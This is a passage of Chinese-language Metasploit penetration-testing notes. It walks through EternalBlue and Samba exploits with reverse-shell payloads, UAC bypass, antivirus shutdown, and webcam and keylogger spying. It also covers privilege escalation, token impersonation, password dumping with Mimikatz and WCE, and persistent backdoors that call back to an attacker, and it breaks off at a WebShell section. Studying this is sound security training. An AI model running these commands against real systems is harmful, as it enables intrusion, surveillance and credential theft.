+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/mssql/mssql_version
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>永恒之蓝实践</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先扫描是否存在</span>
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 载利用攻击模块</span>
+</span></span><span class="line"><span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOST ...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞利用">漏洞利用</h4>
+<p>收集完信息后，选择正确的exploit，payload</p>
+<p>这里假设是Samba
+<code>info exploit/multi/samba/usermap_sript</code>,  可以查看到利用成功率<code>Rank</code>越高，成功率越大
+<code>use exploit/multi/samba/usermap_sript</code>
+<code>show options</code>
+<code>set PAYLOAD cmd/unix/reverse</code>
+&hellip; &hellip;</p>
+<h4 id="bypass-uac">Bypass UAC</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/local/bypassuac
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> session <span class="m">1</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="meterpreter属于后渗透攻击">Meterpreter（属于后渗透攻击）</h4>
+<blockquote>
+<p>Metasploit框架中的一个扩展模块</p>
+</blockquote>
+<p>作为<code>溢出成功以后的</code>攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接
+<a href="https://www.cnblogs.com/backlion/p/9484949.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/backlion/p/9484949.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS<span class="o">[</span>基于主机的入侵检测系统<span class="o">]</span>很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 优势</span>
+</span></span><span class="line"><span class="cl">- 纯内存工作模式，不需要对内存进行写入操作
+</span></span><span class="line"><span class="cl">- 使用加密通信协议，且可以同时与几个信道通信
+</span></span><span class="line"><span class="cl">- 在被攻击进程内工作，不需要创建新的进程
+</span></span><span class="line"><span class="cl">- 易于在多进程之间迁移
+</span></span><span class="line"><span class="cl">- 平台通用
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>进程迁移</strong>
+刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps    <span class="c1"># 获取目标正在运行的进程</span>
+</span></span><span class="line"><span class="cl">getpid    <span class="c1"># 查看Meterpreter shell的进程号</span>
+</span></span><span class="line"><span class="cl">mirate <span class="m">448</span>    <span class="c1"># 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getpid  <span class="c1"># 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 自动迁移进程指令(系统会自动寻找合适的进程然后迁移)</span>
+</span></span><span class="line"><span class="cl">run post/windows/manage/migrate
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>常用命令</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">########## 系统命令（收集系统信息）</span>
+</span></span><span class="line"><span class="cl">systeminfo	<span class="c1"># 查看系统信息</span>
+</span></span><span class="line"><span class="cl">run post/windows/gather/checkv    <span class="c1"># 检查是否为虚拟机</span>
+</span></span><span class="line"><span class="cl">idletime    <span class="c1"># 目标机器最近运行时间</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ifconfig/ipconfig 	<span class="c1"># 查看网卡信息</span>
+</span></span><span class="line"><span class="cl">route	<span class="c1"># 查看路由信息，设置路由（做跳板用）</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">background		<span class="c1"># 把会话放到后台，这个会话继续保持</span>
+</span></span><span class="line"><span class="cl">sessions     <span class="c1"># 查看会话列表</span>
+</span></span><span class="line"><span class="cl">sessions -i 2	<span class="c1"># 进入切回会话2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getuid	<span class="c1"># 获取当前用户id权限</span>
+</span></span><span class="line"><span class="cl">run post/windows/manage/killav <span class="c1"># 关闭杀毒(其他命令自己探索)</span>
+</span></span><span class="line"><span class="cl">run post/windows/manage/enable_rdp <span class="c1"># 开启目标机器的远程桌面</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">run post/windows/manage/autoroute <span class="c1"># 查看目标机的本地子网情况</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 接着进行跳转</span>
+</span></span><span class="line"><span class="cl">background <span class="c1"># 把当前终端隐藏在后台</span>
+</span></span><span class="line"><span class="cl">route add 192.168.0.111 255.255.255.0 <span class="m">1</span>  <span class="c1"># 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络)</span>
+</span></span><span class="line"><span class="cl">route print    <span class="c1"># 查看路由添加结果</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 接着查看</span>
+</span></span><span class="line"><span class="cl">run post/windows/gather/enum_logged_on_users   <span class="c1"># 列举当前有多少用户登录了主机</span>
+</span></span><span class="line"><span class="cl">run post/windows/gather/enum_logged_on_users   <span class="c1"># 继续列举安装在目标机器上的应用</span>
+</span></span><span class="line"><span class="cl">run post/windows/gather/credentials/windows_autologin  <span class="c1"># 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia</span>
+</span></span><span class="line"><span class="cl">load espia <span class="c1"># 先加载该插件</span>
+</span></span><span class="line"><span class="cl">screengrab    <span class="c1"># 就可以抓取此时目标机器的屏幕截图</span>
+</span></span><span class="line"><span class="cl">screenshot    <span class="c1"># 也是截屏</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">webcam snap  <span class="c1"># 打开目标机器摄像头，拍摄一张照片</span>
+</span></span><span class="line"><span class="cl">webcam_stream  <span class="c1"># 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shutdown	   <span class="c1"># 关机</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shell		<span class="c1"># 进入目标系统的shell下面</span>
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>        <span class="c1"># 停止meterpreter会话（也可以停止shell并返回到meterpreter）</span>
+</span></span><span class="line"><span class="cl">quit		<span class="c1"># 关闭当前的Meterpreter会话，返回MSF终端</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">########## 文件系统命令</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>	/   getwd  <span class="c1"># 查看目标机器当前目录 </span>
+</span></span><span class="line"><span class="cl">getlwd    <span class="c1"># 查看本机当前目录 </span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span>	<span class="c1"># 切换目录(注意\的转义)</span>
+</span></span><span class="line"><span class="cl">ls	<span class="c1"># 查看当前目录内容</span>
+</span></span><span class="line"><span class="cl">search	-f *.txt	  -d c: <span class="c1"># 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式</span>
+</span></span><span class="line"><span class="cl">upload	/var/www/test.txt c:<span class="se">\ </span> <span class="c1"># 上传文件到目标机器的路径</span>
+</span></span><span class="line"><span class="cl">download	 c:<span class="se">\t</span>est.txt  <span class="c1"># 下载文件(默认保存到msf的目录)</span>
+</span></span><span class="line"><span class="cl">cat	<span class="c1"># 查看文件内容</span>
+</span></span><span class="line"><span class="cl">edit <span class="c1"># 编辑文件</span>
+</span></span><span class="line"><span class="cl">execute	-f c:<span class="se">\\</span>windows<span class="se">\\</span>system32<span class="se">\\</span>calc.exe  <span class="c1"># 执行文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">run keylogrecorder   .... <span class="c1"># 键盘记录？</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="后渗透攻击提权">后渗透攻击：提权</h6>
+<ul>
+<li>纵向提权</li>
+<li>横向提权</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 获取Meterpreter Shell之后，查看我们是什么权限</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Meterpreter 下输入</span>
+</span></span><span class="line"><span class="cl">shell    <span class="c1"># 进入目标的cmd</span>
+</span></span><span class="line"><span class="cl">whoami /groups  <span class="c1"># 查看当前权限</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 下面就开始进行提权了</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 用本地溢出漏洞，利用现成的exploit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>1.利用WMIC实战MS16-032本地溢出漏洞</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># WMIC是win一个命令行工具(交互模式/非交互模式)，不仅可管理本机还可管理域内所有远程主机(前提是有权限)，而被管理者不需要安装WMIC</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># WMIC在信息搜集和后渗透十分有用，可以调查目标机的进程，服务，用户，用户组，网络连接，硬盘信息，时区，操作系统信息等</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 假设拿到了Meterpreter shell</span>
+</span></span><span class="line"><span class="cl">getuid
+</span></span><span class="line"><span class="cl">getsystem    <span class="c1"># 尝试提权，但是失败</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 接着查看系统打了的补丁(传统方法：在目标cmd输入systeminfo，或查询C:\windows\补丁号.log)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 这里利用WMIC命令列出安装的补丁</span>
+</span></span><span class="line"><span class="cl">WMIC qfe get Caption,Description,HotFixID,IntalledOn
+</span></span><span class="line"><span class="cl"><span class="c1"># 找到打的补丁后，去找exp(然后将系统安装的补丁编号与提权exp编号比对，然后使用没有编号的exp进行提权)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## 漏洞信息网站： 安全焦点， Expolit-DB</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 接下来准备提权(把Meterpreter放到后台：background), 然后搜索ms16-032</span>
+</span></span><span class="line"><span class="cl">search ms16-032    <span class="c1"># 如果找不到，可以试试升级：msfupdate  或者手动添加相应漏洞EXP</span>
+</span></span><span class="line"><span class="cl">use exploit/windows/local/ms16_032_secondary_logon_handle_privsec
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> session <span class="m">1</span>
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl"><span class="c1"># 会返回一个新的session，进入，执行getuid 反省是system权限了</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.令牌窃取</strong>
+令牌(Token)就是系统的<code>临时密钥</code>, 相当与账户密码，特点是随机性和不可预测<br>
+在假冒令牌攻击中需要使用<code>Kerberos</code>协议(一种网络认证协议，其设计目的是通过密钥系统为客户机/服务器应用程序提供强大的认证服务)
+Kerberos工作机制：
+xxx待补充</p>
+<p>假冒令牌实战利用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 假设已经拿到了Meterpreter shell</span>
+</span></span><span class="line"><span class="cl">getuid
+</span></span><span class="line"><span class="cl">getsystem <span class="c1"># 提权失败</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">use incognito
+</span></span><span class="line"><span class="cl">list token -u <span class="c1"># 列出可用的token(会看到结果，根据Meterpreter shell的权限而定)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 假设从输出信息中看到了目标机器的..., 继续在incognito中执行</span>
+</span></span><span class="line"><span class="cl">impersonate_token WIN7-TEST<span class="se">\\</span>Administrator <span class="c1"># 调用incognito中的这个impersonate_token 命令，来假冒Admin进行攻击(注意是两个反斜杠)</span>
+</span></span><span class="line"><span class="cl">shell
+</span></span><span class="line"><span class="cl">whoami  <span class="c1"># 查看权限</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hash攻击</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">###### 1.是使用Hashdump抓取密码</span>
+</span></span><span class="line"><span class="cl">hashdump   <span class="c1"># 导出主机的sam数据库的hash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 另一个更强大的模块</span>
+</span></span><span class="line"><span class="cl">run winsows/gather/smart_hashdump  <span class="c1"># 若是win7,且开启了uac，就要使用绕过uac的模块再继续</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 2.使用Quarks PwDump抓取密码</span>
+</span></span><span class="line"><span class="cl">win32下的一款工具，导出信息十分全面，支持系统版本十分广泛
+</span></span><span class="line"><span class="cl">具体参数再查
+</span></span><span class="line"><span class="cl">QuarksPwDump.exe -dh1 -o 1.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># 还可配合在 Ntdsutil 工具到处DC的密码</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ps: win的密码会加密存放在/windows/system32/config/sam
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 3.使用Windows Credentials Editor抓取密码</span>
+</span></span><span class="line"><span class="cl">WCE<span class="o">(</span>Windows Credentials Editor<span class="o">)</span>  功能强大，不过必须是管理员权限，还要主要免杀
+</span></span><span class="line"><span class="cl"><span class="c1"># 先上传wce到目标</span>
+</span></span><span class="line"><span class="cl">upload wce.exe
+</span></span><span class="line"><span class="cl"><span class="c1"># 在目标的shell下执行</span>
+</span></span><span class="line"><span class="cl">wce -w  <span class="c1"># 便会成功提取明文管理员密码(默认是-l命令读取，-f强制安全方式读取，-g用来计算密码，-c制定会话来执行cmd，-v显示详细信息，-w最关键 --&gt; 查看已登录的明文密码)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 4.使用Mimikatz抓取密码</span>
+</span></span><span class="line"><span class="cl">msf内置了Mimikatz成为一个peterpreter脚本集成
+</span></span><span class="line"><span class="cl">load Mimikatz
+</span></span><span class="line"><span class="cl"><span class="nb">help</span> Mimikatz
+</span></span><span class="line"><span class="cl"><span class="c1"># mimikatz_command # 可以让我们使用Mimikatz全部功能, 如(:: 请求某个模块可用的选项)</span>
+</span></span><span class="line"><span class="cl">mimikatz_command -f hash::
+</span></span><span class="line"><span class="cl">mcv    <span class="c1"># 抓取系统hash值</span>
+</span></span><span class="line"><span class="cl">kerberos    <span class="c1"># 抓取系统票据</span>
+</span></span><span class="line"><span class="cl">wdigest   <span class="c1"># 获取系统账户信息</span>
+</span></span><span class="line"><span class="cl">mimikatz_command -f samdump::hash  <span class="c1"># 抓取hash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## mimikatz 除了抓取hash，还有其他功能：比如 Handle模块，list\kill进程，模拟用户令牌等</span>
+</span></span><span class="line"><span class="cl">mimikatz_command -f handle::
+</span></span><span class="line"><span class="cl">mimikatz_command -f service::  <span class="c1"># servvice模块可以对win的服务进行...</span>
+</span></span><span class="line"><span class="cl">mimikatz_command -f crypto::  <span class="c1"># crypto可以列出 导出任何证书，以及存储在目标机器上的相应的私钥</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># mimikatz 也支持PowerShell调用</span>
+</span></span><span class="line"><span class="cl">脚本P228
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">能在PowerShell中执行mimikatz，偷窃和注入凭证，伪造Kerbero票证创建，还有其他很多功能
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="后渗透攻击移植漏洞利用代码模块">后渗透攻击：移植漏洞利用代码模块</h6>
+<p>支持不同语言编写的模块移植进去，允许开发者开发自己的漏洞利用模块</p>
+<p>MS17-010 &ndash;&gt; 微软SMB远程代码执行漏洞</p>
+<p>演示：移植MS17-010漏洞利用代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># MS17-010 在msf中虽然有集成脚本，但是不适用于03系统，从网上自行下载</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># clone脚本到本地，把rb脚本复制到/usr/share/metasploit-framework/modules/exploits/windows/smb下</span>
+</span></span><span class="line"><span class="cl">raload all  <span class="c1"># 然后在msf中重新加载脚本</span>
+</span></span><span class="line"><span class="cl">之后就能search到了，用use加载它
+</span></span><span class="line"><span class="cl"><span class="c1"># 开始</span>
+</span></span><span class="line"><span class="cl">msfovenom 生成一个DLL文件<span class="o">(</span>在下面set payload<span class="o">)</span>
+</span></span><span class="line"><span class="cl">然后设置该模块的参数
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="后渗透攻击后门">后渗透攻击：后门</h6>
+<p>提取完成之后，就需要留后门了</p>
+<p>1.操作系统后门</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">##### 1.Cymothoa后门</span>
+</span></span><span class="line"><span class="cl">可以将ShellCode注入到现有进程的后门工具
+</span></span><span class="line"><span class="cl">该后门能与被注入进程共存，且如果不检查内存是发现不了的
+</span></span><span class="line"><span class="cl">该后门注入系统的某一进程，返回的是该进程相应的权限<span class="o">(</span>并不需要root<span class="o">)</span>， 但是关闭进程或重启，后门就会停止运行
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ps -aux  <span class="c1"># 查看程序的pid， Win下是 tasklist</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -p指定目标进程的PID，-y指定payload服务端口，-s指定ShellCode编号(cymothoa -S 查看) </span>
+</span></span><span class="line"><span class="cl">cymothoa -p <span class="m">862</span> -s <span class="m">1</span> -y <span class="m">5555</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 连接后门</span>
+</span></span><span class="line"><span class="cl">nc -nvv 192.168.0.112 <span class="m">5555</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 2.Persistence后门</span>
+</span></span><span class="line"><span class="cl">使用安装自启动方式的持续型后门，可以用它创建注册表和文件
+</span></span><span class="line"><span class="cl">run persistence -h  <span class="c1"># 查看命令选项</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建持久型后门</span>
+</span></span><span class="line"><span class="cl">run persistence -A -S -U -i <span class="m">60</span> -p <span class="m">4321</span> -r 162.168.0.112 
+</span></span><span class="line"><span class="cl"><span class="c1"># -A自动启动payload，-S系统启动时自动加载，-U用户登录时自动启动， -X开机时自动加载，-i回连时间间隔，-P监听端口号， -r 目标机器地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sessions  <span class="c1"># 发现会话已成功获取</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.Web后门(WebShell)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
